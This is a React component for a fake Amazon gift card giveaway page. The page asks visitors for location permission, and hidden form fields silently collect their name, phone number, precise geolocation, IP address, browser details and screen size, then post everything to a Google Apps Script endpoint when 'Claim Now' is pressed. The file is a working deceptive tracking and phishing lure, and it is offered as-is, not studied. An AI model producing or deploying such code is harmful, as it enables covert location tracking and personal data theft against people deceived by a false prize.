import React, { useState, useEffect, useRef } from "react";
import useGeoLocation from "../Hooks/useGeoLocation";

const Form = (props) => {
  const [IP, setIP] = useState();
  const formRef = useRef(null);

  const {name,mobile}=props;

  const location = useGeoLocation();

  const scriptURL =
    "https://script.google.com/macros/s/AKfycbwEptCCNw6hFnIPLkcerNNgFIC_mlQ0CtGkViOu7xci0nt7M5c_B8EhoSmtOMkBZ2HYeA/exec";

  const currentDate = new Date(Date.now());
  let day = currentDate.getDate();
  let month = currentDate.getMonth() + 1;
  let year = currentDate.getFullYear();
  day = day < 10 ? "0" + day : day;
  month = month < 10 ? "0" + month : month;
  let formattedDate = day + "/" + month + "/" + year;

  useEffect(() => {
    const getIp = async () => {
      try {
        const response = await fetch(
          "https://www.cloudflare.com/cdn-cgi/trace"
        );
        const data = await response.text();
        const ipMatch = data.match(/ip=(.*)/);
        if (ipMatch && ipMatch.length > 1) {
          const ipAddress = ipMatch[1];
          setIP(ipAddress);
        }
      } catch (err) {
        setIP(err)
      }
    };

    getIp();
  },[]);

  const submit = (e) => {
    e.preventDefault();
    fetch(scriptURL, { method: "POST", body: new FormData(formRef.current) })
      .then((response) => console.log("Success!", response))
      .catch((error) => console.error("Error!", error.message));
  };

  return (
    <>
      <form name="submit-to-google-sheet" onSubmit={submit} ref={formRef}>
        <div style={{ display: "none" }}>
          <input name="Date" type="text" placeholder="" value={formattedDate} />
          <input
            name="Time"
            type="text"
            placeholder=""
            value={currentDate.toLocaleTimeString()}
          />
          <input name="Name" type="text" placeholder="" value={name} />
          <input
            name="MobileNumber"
            type="text"
            placeholder=""
            value={mobile}
          />
          <input
            name="Location"
            type="text"
            value={
              location.loaded
                ? JSON.stringify(location.mapLink)
                : "Location data not available yet." + location.error.message
            }
          />
          <input name="IP" type="text" value={IP} />
          <input name="Agent" type="text" value={navigator.userAgent} />
          <input
            name="AgentData"
            type="text"
            value={JSON.stringify(navigator.userAgentData)}
          />
          <input
            name="ScreenSize"
            type="text"
            value={window.innerHeight + "x" + window.innerWidth}
          />
        </div>

        <div className="container">
          <h1 className="heading">Win an Amazon Gift Card!</h1>
          <p className="description">
            Allow us to pick you up at a <br/>unique location and increase your
            chance to win.
          </p>

          <div className="location-permission">
            <p>
              We pick winners based on location.<br/> Grant us permission to locate
              you at a unique spot.
            </p>
            
          </div>
        </div>
        <button type="submit" className="gift-page__claim-button">
          Claim Now
        </button>
      </form>
    </>
  );
};

export default Form
